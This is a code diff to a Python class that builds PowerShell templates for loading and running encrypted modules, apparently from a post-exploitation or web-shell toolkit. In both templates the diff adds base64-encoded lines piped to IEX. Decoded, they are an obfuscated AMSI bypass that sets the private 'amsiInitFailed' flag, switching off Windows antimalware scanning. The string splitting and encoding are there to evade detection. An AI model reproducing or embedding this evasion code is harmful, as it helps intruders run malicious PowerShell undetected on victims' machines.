@@ -38,6 +38,8 @@ class Invoke_ps_module(Module):
     """
 
     _ps_code = r"""
+                [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JFJlZj1bUmVmXS5Bc3NlbWJseS5HZXRUeXBlKCdTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkFtcycrJ2lVdGlscycpOw=="))|IEX;
+                [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JFJlZi5HZXRGaWVsZCgnYW1zaUluJysnaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUpOw=="))|IEX;
                 $path_in_module="%s";
                 $path_in_app_code="%s";
                 $key=[System.Text.Encoding]::UTF8.GetBytes('%s');
@@ -58,6 +60,8 @@ class Invoke_ps_module(Module):
     """
 
     _ps_code_no_appended_code = r"""
+                [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JFJlZj1bUmVmXS5Bc3NlbWJseS5HZXRUeXBlKCdTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkFtcycrJ2lVdGlscycpOw==")) | IEX;
+                [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JFJlZi5HZXRGaWVsZCgnYW1zaUluJysnaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUpOw==")) | IEX;
                 $path_in="%s";
                 $key=[System.Text.Encoding]::UTF8.GetBytes('%s');
                 $encrypted=[System.IO.File]::ReadAllBytes($path_in);
